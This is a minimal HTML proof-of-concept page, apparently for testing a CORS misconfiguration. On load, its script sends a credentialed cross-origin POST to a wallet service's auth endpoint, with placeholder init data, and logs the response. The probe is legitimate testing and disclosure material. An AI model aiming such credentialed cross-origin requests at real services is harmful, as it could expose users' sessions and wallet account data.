<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS PoC</title>
</head>
<body>
  <h1>CORS PoC Test</h1>
  <script>
    fetch("https://walletbot.me/api/v1/users/auth/", {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        web_view_init_data_raw: "YOUR_WEB_VIEW_INIT_DATA_RAW",
        ep: "settings"
      })
    })
    .then(res => res.text())
    .then(data => console.log("✅ Response:", data))
    .catch(err => console.error("❌ Error:", err));
  </script>
</body>
</html>
